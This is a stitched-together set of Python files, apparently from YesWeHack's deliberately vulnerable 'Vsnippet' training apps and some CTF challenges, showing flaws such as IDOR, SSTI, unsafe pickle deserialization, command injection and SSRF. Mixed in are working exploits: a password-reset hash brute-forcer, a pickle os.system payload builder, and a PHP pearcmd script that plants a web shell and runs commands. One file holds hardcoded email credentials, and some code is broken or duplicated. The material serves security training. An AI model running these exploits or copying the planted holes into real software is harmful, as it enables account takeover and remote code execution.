

from flask import Flask, abort
from flask_restful import Api, Resource
import json

##
# YesWeHack - Vulnerable Code Snippet
##

app = Flask(__name__)
api = Api(app)

class UsersDetails(Resource):
    def get(self, id):
        try:
            return {'users':data['accounts'][id]}
        except:
            return 'Invalid id'

data = json.load(open('users.json', 'r'))

def UserAuthorization(s:str):#<-(Ignore)
    #Code...
    pass

@app.route('/')
def index():
    return 'API v1.0'

api.add_resource(UsersDetails, '/users/<string:id>')
@app.route('/users')
def users():
    if UserAuthorization():
        #Code...
        pass
    else: 
        return abort(403, 'You need authorization to access this endpoint.')


#Start the vulnerable server:
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)#!/usr/bin/python3
import hashlib, argparse, requests

## [ 15-idor-password-reset.php ]
# Exploit the password reset hash and reset the password for the victim
# Use: python3 15-exploit.py -h
##

def UserParse():
    parser = argparse.ArgumentParser()

    parser.add_argument('-u', help='Target URL', default='http://127.0.0.1:1337/', action='store_true')
    parser.add_argument('-r', help='Range of int to bruteforce', default='1000-9999')
    parser.add_argument('-e', help='Email of user', default='Mario@vsnippetmail.com')
    parser.add_argument('-p', help='New password to set', default='Hacked1337')

    option = parser.parse_args()
    return option

#Encode string to MD5 hash:
def Em5(i):
    return str(hashlib.md5(str(i).encode('utf')).hexdigest())

#Just to look cool: ;)
def LoadingBar(x, y):
    v = round(((x / y)*100))
    try:
        if v%2 == 1:
            print('['+str(v)+'%]', ((v*'=')+'>')+((100-v)*' ')+']', end='\r')
    except:
        return

#Setup Exploit conf:
bar = 0
opt = UserParse()
passwd = str(opt.p)

#Verbose:
print(f'Exploit options:\nTarget:{opt.u}')
print(f'Preform a password reset request on user : {opt.e}')

url = f'{opt.u}?email={opt.e}&new'
r = requests.get(url)

if 'received a new password reset hash' in r.text:
    print('User now has a valid password reset hash')
else:
    print("No password hash was sent to user")
    exit()

#Run Exploit:
r = opt.r.split('-')
url = f'{opt.u}?email={opt.e}&hash=HASH'
min = int(r[0]); max = int(r[1])
for i in range(min, max):
    LoadingBar(i, max)

    u = url.replace('HASH', Em5(i))
    r = requests.post(u, data={'passwd': passwd})
    
    #Hash found, success:
    if 'Password changed' in r.text:
        print(f'\n[\033[1;32mOK\033[0m] Exploited, hash:{Em5(i)} password changed to:{opt.p}')
        exit()

print('\r[\033[1;31mFAI\033[0m] Did not exploit it.')
from flask import Flask
import html
#Note : (This code is never a part of the vulnerable code snippet. It's only for design.)

r = '#ff0000'
w = '#ffffff'
g = '#00ff55'
dg = '#00b33c'
b = '#0052cc'
p = '#cc00cc'
s = '#ffcc66'

def Design(app:Flask, file:str, title:str, desc='') -> Flask:
    app.config['TITLE'] = title
    with open(file, 'r') as f: app.config['SOURCE_CODE'] = ''.join([i for i in f])

    return app

#!/usr/bin/python3
from flask import Flask, render_template, request
from ignore.design import design
import base64, json
app = design.Design(Flask(__name__), __file__, 'Vsnippet 41 - Basic Insecure direct object references (IDOR)')

##
# YesWeHack - Vulnerable code snippets
##

@app.route('/')
def index():
    userData = {}
    userDataBase64 =  request.cookies.get('userdata')

    if ( userDataBase64 is not None ):
        try:
            # Make the JSON data into a dictonary:
            userDataJSON = base64.b64decode(userDataBase64)
            userData = json.loads(userDataJSON)
        except:
            return render_template('index.html', result='Invalid user data')

    if userData['role'] is not None and userData['role'] == 'admin':
        #Code ...
        return render_template('index.html', result=f'Admin dashboard')

    return render_template('index.html', result=f'Not authorized to access this resource')


#Start the vulnerable server:
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)

import smtplib

# Sample credentials (for demonstration purposes only)
smtp_s = "smtp.gmail.com"
smtp_p = 587
smtp_u = "rohit@gmail.com"
smtp_p = "rohit#@tiger"

# Create a connection to the SMTP server
server = smtplib.SMTP(smtp_server, smtp_port)

# Start TLS for security
server.starttls()

try:
    # Log in to the server
    server.login(smtp_user, smtp_p)
    print("Logged in successfully")

    # You can now send emails using server.sendmail() method
    # Example:
    # from_address = "your_email@example.com"
    # to_address = "recipient@example.com"
    # message = """\
    # Subject: Test Email
    #
    # This is a test email.
    # """
    # server.sendmail(from_address, to_address, message)

except smtplib.SMTPAuthenticationError:
    print("Failed to log in. Check your credentials.")
except Exception as e:
    print(f"An error occurred: {e}")
finally:
    # Close the connection to the SMTP server
    server.quit()
from flask import Flask
#Note : (This code is never a part of the vulnerable code snippet. It's only for design.)

r = '#ff0000'
w = '#ffffff'
g = '#00ff55'
dg = '#00b33c'
b = '#0052cc'
p = '#cc00cc'
s = '#ffcc66'

def Design(app:Flask, file:str, title:str, desc='') -> Flask:
    app.config['TITLE'] = title
    with open(file, 'r') as f: app.config['SOURCE_CODE'] = ''.join([i for i in f])

    return app

#!/usr/bin/python3
from flask import Flask, render_template, request
from flask_caching import Cache
from ignore.design import design
import datetime
app = design.Design(Flask(__name__), __file__, 'Vsnippet #27 - Cache poisoning classic')

##
#   YesWeHack - Vulnerable Code Snippet
##

#Setup cache configurations:
config = {
    "DEBUG": True,
    "CACHE_TYPE": "SimpleCache",
}
app.config.from_mapping(config)
cache = Cache(app)

@app.route("/")
@cache.cached(timeout=10)
def index():
    HTMLContent = '''
    <div id="cache_info">
      <p> The page was cached at: [%s] </p>
      <p> The user was redirected from: [%s] </p>
    </div>
    ''' %  (str(datetime.datetime.now()), str(request.headers.get("Referer")))
    
    return render_template('index.html', result=HTMLContent)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)from flask import Flask
#Note : (This code is never a part of the vulnerable code snippet. It's only for design.)

r = '#ff0000'
w = '#ffffff'
g = '#00ff55'
dg = '#00b33c'
b = '#0052cc'
p = '#cc00cc'
s = '#ffcc66'

def Design(app:Flask, file:str, title:str, desc='') -> Flask:
    app.config['TITLE'] = title
    with open(file, 'r') as f: app.config['SOURCE_CODE'] = ''.join([i for i in f])

    return app

#!/usr/bin/python3
from flask import Flask, render_template, request
from ignore.design import design
app = design.Design(Flask(__name__), __file__, 'Vsnippet #28 - Business logic money transfer')

##
#   YesWeHack - Vulnerable Code Snippet
##

class Account:
    def __init__(self, username:str):
        self.User:str = username
        self.Currency:str = '€'
        self.Balance:float = 1000

    def Update_Balance(self, money:float): 
        self.Balance = money

    ##Withdraw from the users balance:
    def Withdraw(self, amount:float):
        if amount <= self.Balance:
            money = self.Balance - amount
            self.Update_Balance(money)
            return money
        return 0

def GetUserBySession():
    ##Code... (Get the user relative to the session and add the csrf token)
    return Account('Jerry')

user = GetUserBySession()

@app.route('/')
def index():
    paramURL = request.args
    message = ''
    try:
        withdrawAmount = float(paramURL.get('amount'))
        if withdrawAmount is not None and withdrawAmount <= user.Balance:
            user.Withdraw(withdrawAmount)
            message = f'<b style="color:lightgreen">You withdraw {user.Currency} : {str(withdrawAmount)}</b>!'
        else:
            message = f'<b style="color:red">You don\'t have that much!</b>'
    except:
        pass

    return render_template('index.html', 
        username = user.User,
        balance = str(user.Balance),
        message = message
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)# Python's revenge
# This is a easy python sandbox, can you bypass it and get the flag?
# https://hitbxctf2018.xctf.org.cn/contest_challenge/
from __future__ import unicode_literals
from flask import Flask, request, make_response, redirect, url_for, session
from flask import render_template, flash, redirect, url_for, request
from werkzeug.security import safe_str_cmp
from base64 import b64decode as b64d
from base64 import b64encode as b64e
from hashlib import sha256
from cStringIO import StringIO
import random
import string

import os
import sys
import subprocess
import commands
import pickle
import cPickle
import marshal
import os.path
import filecmp
import glob
import linecache
import shutil
import dircache
import io
import timeit
import popen2
import code
import codeop
import pty
import posixfile

SECRET_KEY = 'you will never guess'

if not os.path.exists('.secret'):
    with open(".secret", "w") as f:
        secret = ''.join(random.choice(string.ascii_letters + string.digits)
                         for x in range(4))
        f.write(secret)
with open(".secret", "r") as f:
    cookie_secret = f.read().strip()

app = Flask(__name__)
app.config.from_object(__name__)

black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]


@app.before_request
def count():
    session['cnt'] = 0


@app.route('/')
def home():
    remembered_str = 'Hello, here\'s what we remember for you. And you can change, delete or extend it.'
    new_str = 'Hello fellow zombie, have you found a tasty brain and want to remember where? Go right here and enter it:'
    location = getlocation()
    if location == False:
        return redirect(url_for("clear"))
    return render_template('index.html', txt=remembered_str, location=location)


@app.route('/clear')
def clear():
    flash("Reminder cleared!")
    response = redirect(url_for('home'))
    response.set_cookie('location', max_age=0)
    return response


@app.route('/reminder', methods=['POST', 'GET'])
def reminder():
    if request.method == 'POST':
        location = request.form["reminder"]
        if location == '':
            flash("Message cleared, tell us when you have found more brains.")
        else:
            flash("We will remember where you find your brains.")
        location = b64e(pickle.dumps(location))
        cookie = make_cookie(location, cookie_secret)
        response = redirect(url_for('home'))
        response.set_cookie('location', cookie)
        return response
    location = getlocation()
    if location == False:
        return redirect(url_for("clear"))
    return render_template('reminder.html')


class FilterException(Exception):
    def __init__(self, value):
        super(FilterException, self).__init__(
            'The callable object {value} is not allowed'.format(value=str(value)))


class TimesException(Exception):
    def __init__(self):
        super(TimesException, self).__init__(
            'Call func too many times!')


def _hook_call(func):
    def wrapper(*args, **kwargs):
        session['cnt'] += 1
        print session['cnt']
        print args[0].stack
        for i in args[0].stack:
            if i in black_type_list:
                raise FilterException(args[0].stack[-2])
            if session['cnt'] > 4:
                raise TimesException()
        return func(*args, **kwargs)
    return wrapper


def loads(strs):
    reload(pickle)
    files = StringIO(strs)
    unpkler = pickle.Unpickler(files)
    unpkler.dispatch[pickle.REDUCE] = _hook_call(
        unpkler.dispatch[pickle.REDUCE])
    return unpkler.load()


def getlocation():
    cookie = request.cookies.get('location')
    if not cookie:
        return ''
    (digest, location) = cookie.split("!")
    if not safe_str_cmp(calc_digest(location, cookie_secret), digest):
        flash("Hey! This is not a valid cookie! Leave me alone.")
        return False
    location = loads(b64d(location))
    return location


def make_cookie(location, secret):
    return "%s!%s" % (calc_digest(location, secret), location)


def calc_digest(location, secret):
    return sha256("%s%s" % (location, secret)).hexdigest()


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5051)
class Vault(object):
    '''R/W an ansible-vault yaml file'''

    def __init__(self, password):
        self.password = password
        self.vault = VaultLib(password)

    def load(self, stream):
        '''read vault steam and return python object'''
        return yaml.load(self.vault.decrypt(stream)) [0]
from flask import Flask
import html
#Note : (This code is never a part of the vulnerable code snippet. It's only for design.)

r = '#ff0000'
w = '#ffffff'
g = '#00ff55'
dg = '#00b33c'
b = '#0052cc'
p = '#cc00cc'
s = '#ffcc66'

def Design(app:Flask, file:str, title:str, desc='') -> Flask:
    app.config['TITLE'] = title
    with open(file, 'r') as f: app.config['SOURCE_CODE'] = ''.join([i for i in f])

    return app

#!/usr/bin/python3
from flask import Flask, json, render_template, request
from ignore.design import design
import re, html
app = design.Design(Flask(__name__), __file__, 'Vsnippet #34 - Regular expression Denial of Service (ReDoS)')

##
# YesWeHack - Vulnerable code snippets
##


@app.route('/')
def index():
    search = request.args.get('search')

    if ( search is None ):
        return render_template('index.html', result='No search regex was provided!')

    with open('items.json', 'r') as items:
        products = json.load(items)['products']

        if re.search(r'^([a-zA-Z0-9_-]+)*\[subscribe\]$', search):
            #Code... check if the user is subscribed...
            return render_template('index.html', result='Only for true subscribers')

        for name in products:
            if search in name:
               return render_template('index.html', result=f'We got that! - {products[name]}')

    return render_template('index.html', result=f'No item found for {html.escape(search)}!')


#Start the vulnerable server:
if __name__=='__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)

from flask import Flask, render_template, request
import html
import customLog
from ignore.design import design
app = design.Design(Flask(__name__), __file__, 'Vsnippet 13 - File upload overwrite python file')

##
# YesWeHack - Vulnerable code snippets
##


app = Flask(__name__)
app.config["UPLOAD_FOLDER"] = "share/"

@app.route('/share')
def sharedFiles():
    # Get: Filename -> Log -> Read it
    getFile = request.args.get("filename").replace('/','').replace('\\', '')
    file = open(app.config['UPLOAD_FOLDER'] + getFile, "r")

    return file.read() 

@app.route('/', methods = ['GET', 'POST'])
def index():
    #Just some custom "logging" here:
    customLog.log()

    #Upload your file:
    if request.method == 'POST':
        f = request.files['file']
        f.save(app.config["UPLOAD_FOLDER"] + f.filename)
        
        return ('''<h2>File: succeeded!</h2><br>
        <a href="/">..Back</a><br>
        <a href="./share?filename=%s">See my file</a>''' % html.escape(f.filename))

    return render_template('index.html')

#Start the server:
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)from flask import Flask
#Note : (This code is never a part of the vulnerable code snippet. It's only for design.)

r = '#ff0000'
w = '#ffffff'
g = '#00ff55'
dg = '#00b33c'
b = '#0052cc'
p = '#cc00cc'
s = '#ffcc66'

def Design(app:Flask, file:str, title:str, desc='') -> Flask:
    app.config['TITLE'] = title
    with open(file, 'r') as f: app.config['SOURCE_CODE'] = ''.join([i for i in f])

    return app

## [Used to custom "log"]
# Replace & hack me if you can!
##
def log():
    print("[LOG] Some random log here")
import os

from flask import (
    Flask,
    render_template,
    request,
    url_for,
    redirect,
    session,
    render_template_string
)
from flask.ext.session import Session

app = Flask(__name__)


execfile('flag.py')
execfile('key.py')

FLAG = flag
app.secret_key = key


@app.route("/golem", methods=["GET", "POST"])
def golem():
    if request.method != "POST":
        return redirect(url_for("index"))

    golem = request.form.get("golem") or None

    if golem is not None:
        golem = golem.replace(".", "").replace(
            "_", "").replace("{", "").replace("}", "")

    if "golem" not in session or session['golem'] is None:
        session['golem'] = golem

    template = None

    if session['golem'] is not None:
        template = '''{% % extends "layout.html" % %}
		{% % block body % %}
		<h1 > Golem Name < /h1 >
		<div class ="row >
		<div class = "col-md-6 col-md-offset-3 center" >
		Hello: % s, why you don't look at our <a href=' / article?name = article'> article < /a >?
		< / div >
		< / div >
		{% % endblock % %}
		''' % session['golem']

        print

        session['golem'] = None

    return render_template_string(template)


@app.route("/", methods=["GET"])
def index():
    return render_template("main.html")


@app.route('/article', methods=['GET'])
def article():

    error = 0

    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = 'article'

    if page.find('flag') >= 0:
        page = 'notallowed.txt'

    try:
        template = open('/home/golem/articles/{}'.format(page)).read()
    except Exception as e:
        template = e

    return render_template('article.html', template=template)

if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=False)
import os

from flask import (
    Flask,
    render_template,
    request,
    url_for,
    redirect,
    session,
    render_template_string
)
from flask.ext.session import Session

app = Flask(__name__)


execfile('flag.py')
execfile('key.py')

FLAG = flag
app.secret_key = key


@app.route("/golem", methods=["GET", "POST"])
def golem():
    if request.method != "POST":
        return redirect(url_for("index"))

    golem = request.form.get("golem") or None

    if golem is not None:
        golem = golem.replace(".", "").replace(
            "_", "").replace("{", "").replace("}", "")

    if "golem" not in session or session['golem'] is None:
        session['golem'] = golem

    template = None

    if session['golem'] is not None:
        template = '''{% % extends "layout.html" % %}
		{% % block body % %}
		<h1 > Golem Name < /h1 >
		<div class ="row >
		<div class = "col-md-6 col-md-offset-3 center" >
		Hello: % s, why you don't look at our <a href=' / article?name = article'> article < /a >?
		< / div >
		< / div >
		{% % endblock % %}
		''' % session['golem']

        print

        session['golem'] = None

    return render_template_string(template)


@app.route("/", methods=["GET"])
def index():
    return render_template("main.html")


@app.route('/article', methods=['GET'])
def article():

    error = 0

    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = 'article'

    if page.find('flag') >= 0:
        page = 'notallowed.txt'

    try:
        template = open('/home/golem/articles/{}'.format(page)).read()
    except Exception as e:
        template = e

    return render_template('article.html', template=template)

if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=False)
from jinja2 import Template
from flask import request

import flask

app = flask.Flask(__name__)
app.config['DEBUG'] = True

@app.route('/', methods=['GET'])
def home():
    renderer = Template('Hello, ' + request.args['name'])
    return renderer.render()

app.run()
from flask import Flask
#Note : (This code is never a part of the vulnerable code snippet. It's only for design.)

r = '#ff0000'
w = '#ffffff'
g = '#00ff55'
dg = '#00b33c'
b = '#0052cc'
p = '#cc00cc'
s = '#ffcc66'

def Design(app:Flask, file:str, title:str, desc='') -> Flask:
    app.config['TITLE'] = title
    with open(file, 'r') as f: app.config['SOURCE_CODE'] = ''.join([i for i in f])

    return app

from flask import Flask, render_template_string, render_template, request
import html
from ignore.design import design
app = design.Design(Flask(__name__), __file__, 'Vsnippet 6 - Server Side Template Injection (SSTI)')

##
# YesWeHack - Vulnerable code snippets
##


def MySQL_Get(table, data):#<-Dummy function
    return False, ""
def searchResult():#<-Dummy function
    return ""


def NoItemFound(s):
    tpl = ('''
    <script src="{{ domain }}/main.js"></script>
    <h3 id="search">No result for: %s</h3>
    ''' % s)
    return render_template_string(tpl, domain=request.url_root)

@app.route('/')
def index():
    try:
        #Get the user search value:
        search = html.escape(request.args.get('search'))
    except:
        return render_template('index.html', result="No search provided")


    db_status, db_data = MySQL_Get("products", search)
    if db_status:
        data = searchResult(db_data)

    else:
        data = NoItemFound(search)

    #Return content to client:
    return render_template('index.html', result=data)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)
#!/usr/bin/python3
from flask import Flask, json, render_template, request
import datetime
from ignore.design import design
app = design.Design(Flask(__name__), __file__, 'Vsnippet #32 - Format injection classic')


##
# YesWeHack - Vulnerable code snippets
##

@app.route('/')
def index():

    id = request.args.get('id')
    msg = f"Could not find item for {id}"

    #Extract all items from our JSON file:
    with open('items.json', 'r') as items:
        data = json.load(items)

        if id is None:
            return render_template('index.html', result="Error")

        elif (id is not None) and (id in data.keys()):
            return render_template('index.html', result=str(data[id]))

        else:
            return render_template('index.html', result=json.loads( ('{{ "{0}":"'+msg+'" }}').format(datetime.datetime.now()) ))


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)
from flask import Flask
#Note : (This code is never a part of the vulnerable code snippet. It's only for design.)

r = '#ff0000'
w = '#ffffff'
g = '#00ff55'
dg = '#00b33c'
b = '#0052cc'
p = '#cc00cc'
s = '#ffcc66'

def Design(app:Flask, file:str, title:str, desc='') -> Flask:
    app.config['TITLE'] = title
    with open(file, 'r') as f: app.config['SOURCE_CODE'] = ''.join([i for i in f])

    return app

#!/usr/bin/python3
import argparse, http.client

def UserParse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', type=str, help='Target hostname/ip to exploit')
    parser.add_argument('-c', '--cmd', type=str, help='Command to execute', default='id')
    parser.add_argument('-f', '--filename', type=str, help='Command to execute', default='rce.php')

    return parser.parse_args()

#Setup Exploit conf:
opt = UserParse()

if opt.target is None or opt.cmd is None or opt.filename is None:
    print(":: Invalid arguments")
    exit(1)

print(":: Exploit options: Target:%s" % opt.target)

cmd = str(opt.cmd).replace(' ', '$IFS')


payload = f'?+config-create+/&page=../../../../../../../../usr/local/lib/php/pearcmd&/<?=system(\'{cmd}\');die?>+/var/www/html/{opt.filename}'

print(":: final payload:", payload)

#Exploit process:
conn = http.client.HTTPConnection(opt.target, 80)
conn.request('GET', payload)
conn.getresponse()
conn.close()


#Trigger the php file and executed the command provided by the user:
conn.request('GET', f'/{opt.filename}')
resp = conn.getresponse().read().decode()

result = '\n'.join( resp.split("\n")[2:] )
print(f'''------------\n{result}\n------------''')

conn.close()
from flask import Flask
#Note : (This code is never a part of the vulnerable code snippet. It's only for design.)

r = '#ff0000'
w = '#ffffff'
g = '#00ff55'
dg = '#00b33c'
b = '#0052cc'
p = '#cc00cc'
s = '#ffcc66'

def Design(app:Flask, file:str, title:str, desc='') -> Flask:
    app.config['TITLE'] = title
    with open(file, 'r') as f: app.config['SOURCE_CODE'] = ''.join([i for i in f])

    return app

from flask import Flask, render_template, request
import os, ipaddress
from ignore.design import design
app = design.Design(Flask(__name__), __file__, 'Vsnippet - Classic command injection')

##
# YesWeHack - Vulnerable code snippets
##


@app.route('/', methods = ['GET', 'POST'])
def index():
    if request.method == "GET":
        return render_template('index.html', result="")
    
    elif request.method == "POST":
        method = request.form.get("method")
        if method is None or method == "":
            return render_template('index.html', result="The post parameter 'method' is missing in the request")
        
        return render_template('index.html', result=os.popen(f"curl 'http://localhost:1337/{method}'").read())
    
    return "Unsupported request method"


# Dummy system health checker
@app.route('/health')
def health():
    try:
        if ipaddress.ip_address(request.remote_addr).is_loopback:
            return "The health of the system is quite good!"
    except:
        pass
    return "Unauthorized"        


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)
import os
from flask import Flask, request
app = Flask(__name__)

# curl -X GET "http://localhost:5000/tainted7/touch%20HELLO"
@app.route("/tainted7/<something>")
def test_sources_7(something):
    
    os.system(request.remote_addr) 

    return "foo"

if __name__ == "__main__":
	app.run(debug=True) 
from flask import Flask
#Note : (This code is never a part of the vulnerable code snippet. It's only for design.)

r = '#ff0000'
w = '#ffffff'
g = '#00ff55'
dg = '#00b33c'
b = '#0052cc'
p = '#cc00cc'
s = '#ffcc66'

def Design(app:Flask, file:str, title:str, desc='') -> Flask:
    app.config['TITLE'] = title
    with open(file, 'r') as f: app.config['SOURCE_CODE'] = ''.join([i for i in f])

    return app

#!/usr/bin/python3
from flask import Flask, render_template, request
from ignore.design import design
import re, base64, requests
app = design.Design(Flask(__name__), __file__, 'Vsnippet #32 - Format injection classic')

##
# YesWeHack - Vulnerable code snippets
##

def RequestImage(url:str|None):
    if url is None:
        return b""

    #White/Black - lists
    lst_proto = ['http', 'https']
    lst_local = ['localhost', '127.0.0.1']
    
    #Check protocol and requested URL:
    protocol = re.search(r'^(.*?)://', url).group(1)
    URLCheck = re.search(r'^.*://(.*?)(:|/)', url).group(1)

    if (URLCheck in lst_local) and (protocol in lst_proto):
        return b""
        
    res = requests.get(url)

    return res.content

@app.route('/')
def index():
    #Handle image URL - user input
    imageURL = RequestImage(request.args.get('image'))

    imageB64 = base64.b64encode(imageURL).decode('utf-8')
    image = ('''
    <h1>Here is your image!!</h1>
    <img src="data:image/jpg;base64,%s">''' % imageB64)

    return render_template('index.html', result=image)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)
#!/usr/bin/python3
import os, base64, pickle

ic = {
    'k': '[\033[1;32mOK\033[0m] ',
    'i': '[\033[1;34mINF\033[0m] ',
    'w': '[\033[33mWRN\033[0m] ',
    'f': '[\033[1;31mFAI\033[0m] ',
}

class Exploit(object):
    def __reduce__(self):
        return (os.system,(cmd,))

#User input:
print("Exploit 17-Vsnippet | YesWeHack")
cmd = str(input(ic['i']+' Command to execute with the exploit: '))

#Default set cmd:
if cmd in ['', ' ', '\t']:
    print(ic['w']+'No command default command set => whoami')
    cmd = 'whoami'

#Payload setup & verbose:
payload = base64.b64encode(pickle.dumps(Exploit()))
print(ic['k'], payload.decode('ascii'))
from flask import Flask
#Note : (This code is never a part of the vulnerable code snippet. It's only for design.)

r = '#ff0000'
w = '#ffffff'
g = '#00ff55'
dg = '#00b33c'
b = '#0052cc'
p = '#cc00cc'
s = '#ffcc66'

def Design(app:Flask, file:str, title:str, desc='') -> Flask:
    app.config['TITLE'] = title
    with open(file, 'r') as f: app.config['SOURCE_CODE'] = ''.join([i for i in f])

    return app

#!/usr/bin/python3
from flask import Flask, render_template, Response, request
from datetime import date
import base64 as b64
import pickle

##
# YesWeHack - Vulnerable Code Snippet
##

app = Flask(__name__)


def User_RedirectTo(d):
    ##Handle the user data and redirect
    #Code...
    return "<h2>Redirecting you!</h2>"

class CreateData(object,):
#Create an object to store user data:
    def __init__(self, id, name, date):
        self.id = id
        self.name = name
        self.date = date

    def __str__(self):
        return str(self.__dict__)


@app.route('/', methods = ['GET', 'POST'])
def index():
    resp = Response()
    
    #Get user data from cookie:
    dataCookie = request.cookies.get('userData')

    #Verify & deserialize user data:
    if dataCookie is not None:
        try:
            data = b64.b64decode(bytes(dataCookie, 'UTF-8'))
            data = pickle.loads(data)
            return User_RedirectTo(data)
        
        except:
            return render_template('index.html', result="<h2>Invalid data...</h2>")

    else:
        #Create a new data object and set it as the user's cookie:
        newData = CreateData(None, 'guest', date.today().strftime('%d/%m/%Y'))
        newData = bytes(str(newData), 'UTF-8')
        resp.set_cookie('userData', b64.b64encode(newData))
        
        return resp

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)from flask import Flask
#Note : (This code is never a part of the vulnerable code snippet. It's only for design.)

r = '#ff0000'
w = '#ffffff'
g = '#00ff55'
dg = '#00b33c'
b = '#0052cc'
p = '#cc00cc'
s = '#ffcc66'

def Design(app:Flask, file:str, title:str, desc='') -> Flask:
    app.config['TITLE'] = title
    with open(file, 'r') as f: app.config['SOURCE_CODE'] = ''.join([i for i in f])

    return app

from flask import Flask, request, render_template
from ignore.design import design
title = 'Vsnippet #4 - Cross Site Scripting (XSS) script tag outbreak'
app = design.Design(Flask(__name__), __file__, title)

##
# YesWeHack - Vulnerable code snippets
##

def renderHTML(str):
    HTML = ('''
    <h2 id="welcome">Welcome: </h2>
    <script>
        name = '%s';
        out = document.getElementById('welcome');
        out.innerHTML += name;
    </script>
    ''' % str)

    return HTML

@app.route('/')
def index():
    try:
        name = request.args.get('name').replace('\'', '', -1)
    except:
        name = 'Guest'

    return render_template('index.html', result=renderHTML(name))


#Start the server:
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)
#!/usr/bin/python3
import hashlib, argparse, requests

##[15-PasswordReset exploit]
# Exploit the password reset hash and reset the password for the victim
#
# Use: python3 15-Exploit.py -h
##

def UserParse():
    parser = argparse.ArgumentParser()

    parser.add_argument('-u', help='Target including [EMAIL] & [HASH] to exploit.', default='http://127.0.0.1:5000/?email=EMAIL&hash=HASH', action='store_true')
    parser.add_argument('-r', help='Range of int to bruteforce', default='1000-9999')
    parser.add_argument('-e', help='Email of user', default='Mario@vsnippetmail.com')
    parser.add_argument('-p', help='New password to set', default='Hacked1337')

    option = parser.parse_args()
    return option

#Encode string to MD5 hash:
def Em5(i):
    return str(hashlib.md5(str(i).encode("utf")).hexdigest())

#Just to look cool: ;)
def LoadingBar(x, y):
    v = round(((x / y)*100))
    try:
        if v%2 == 1:
            print('['+str(v)+'%]', ((v*"=")+'>')+((100-v)*' ')+']', end='\r')
    except:
        return



#Setup Exploit conf:
bar = 0
opt = UserParse()
url = str(opt.u).replace("EMAIL", opt.e)
passwd = str(opt.p)

#Verbose:
print("Exploit options: Target:%s" % url)

#Run Exploit:
r = opt.r.split('-')
min = int(r[0]); max = int(r[1])
for i in range(min, max):
    LoadingBar(i, max)

    u = url.replace('HASH', Em5(i))
    r = requests.post(u, data={"passwd": passwd})
    
    #Hash found, success:
    if "Password changed" in r.text:
        print("\n[\033[1;32mOK\033[0m] Exploited, hash="+Em5(i))
        exit()

print("\r[\033[1;31mFAI\033[0m] Did not exploit it.")
#!/usr/bin/python3
import argparse, http.client

def UserParse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', type=str, help='Target hostname/ip to exploit')
    parser.add_argument('-c', '--cmd', type=str, help='Command to execute', default='id')
    parser.add_argument('-f', '--filename', type=str, help='Command to execute', default='rce.php')

    return parser.parse_args()

#Setup Exploit conf:
opt = UserParse()

if opt.target is None or opt.cmd is None or opt.filename is None:
    print(":: Invalid arguments")
    exit(1)

print(":: Exploit options: Target:%s" % opt.target)

cmd = str(opt.cmd).replace(' ', '$IFS')


payload = f'?+config-create+/&page=../../../../../../../../usr/local/lib/php/pearcmd&/<?=system(\'{cmd}\');die?>+/var/www/html/{opt.filename}'

print(":: final payload:", payload)

#Exploit process:
conn = http.client.HTTPConnection(opt.target, 80)
conn.request('GET', payload)
conn.getresponse()
conn.close()


#Trigger the php file and executed the command provided by the user:
conn.request('GET', f'/{opt.filename}')
resp = conn.getresponse().read().decode()

result = '\n'.join( resp.split("\n")[2:] )
print(f'''------------\n{result}\n------------''')

conn.close()


if __name__ == "__main__":
    main()
